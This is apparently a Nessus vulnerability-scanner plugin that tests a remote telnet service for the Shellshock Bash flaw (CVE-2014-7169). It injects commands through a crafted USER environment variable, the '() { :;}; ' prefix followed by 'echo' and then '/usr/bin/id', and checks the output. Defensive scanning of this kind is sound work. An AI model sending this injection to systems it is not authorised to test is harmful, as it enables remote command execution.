#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77857);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2017/04/25 20:29:04 $");

  script_cve_id("CVE-2014-7169");
  script_bugtraq_id(70137);
  script_osvdb_id(112004);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");

  script_name(english:"GNU Bash Local Environment Variable Handling Command Injection via Telnet (CVE-2014-7169) (Shellshock)");
  script_summary(english:"Tests environment variable handling.");

  script_set_attribute(attribute:"synopsis", value:"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker could remotely execute
arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:"Update Bash.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "telnet.nasl");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");
include("telnet2_func.inc");
include("audit.inc");

port = get_service(svc:"telnet", default:23, exit_on_fail:TRUE);

global_var rcvdata;
global_var cnt;
global_var two_output;

function telnet_callback()
{
  local_var data, report;

  data = _FCT_ANON_ARGS[0];

  # Accumulate each byte as it's received.
  if (data && ord(data[0]) != 0x00 && ord(data[0]) != 0x0d) rcvdata += data[0];

  if ( 'Plugin output: 2' >< rcvdata && data[0] == '\n' )
  {
    two_output = rcvdata;
    return -1;
  }

  if ( 'uid=' >< rcvdata && data[0] == '\n' )
  {
    report =
'It was possible to exploit this vulnerability by sending a malformed
USER environment variable to the remote server, which allowed us to
execute the \'id\' command:\n' + rcvdata;

    security_hole(port:port, extra:report);
    exit(0);
  }

  if ("login: " >< rcvdata || 'assword:' >< rcvdata )
    exit(0, "The remote host is running a telnet server that is not configured to run a shell script on connect, and so it is not affected.");
}

# Set up the environment.
test_command = "echo Plugin output: $((1+1))";
env_data =
  mkbyte(0) +
  mkbyte(0) + "USER" +
    mkbyte(1) + "() { :;}; " + test_command;

options = NULL;
options[0] = make_list(OPT_NEW_ENV, env_data);

cnt = 0;
# Connect and process options.
if (!telnet2_init(port:port, options:options, timeout:5*get_read_timeout()))
  audit(AUDIT_SVC_FAIL, "telnet", port);

rcvdata = NULL;
two_output = NULL;

telnet_loop();

# Set up the environment.
test_command = "/usr/bin/id";
env_data =
  mkbyte(0) +
  mkbyte(0) + "USER" +
    mkbyte(1) + "() { :;}; " + test_command;

options = NULL;
options[0] = make_list(OPT_NEW_ENV, env_data);

cnt = 0;
# Connect and process options.
if (!telnet2_init(port:port, options:options, timeout:5*get_read_timeout()))
  audit(AUDIT_SVC_FAIL, "telnet", port);

rcvdata = NULL;
telnet_loop();

if (!isnull(two_output))
{
  report =
'It was possible to exploit this vulnerability by sending a malformed
USER environment variable to the remote server, which allowed us to
execute the \'echo Plugin output: $((1+1))\' command:\n' + two_output;

  security_hole(port:port, extra:report);
  exit(0);
}

audit(AUDIT_HOST_NOT, "affected");
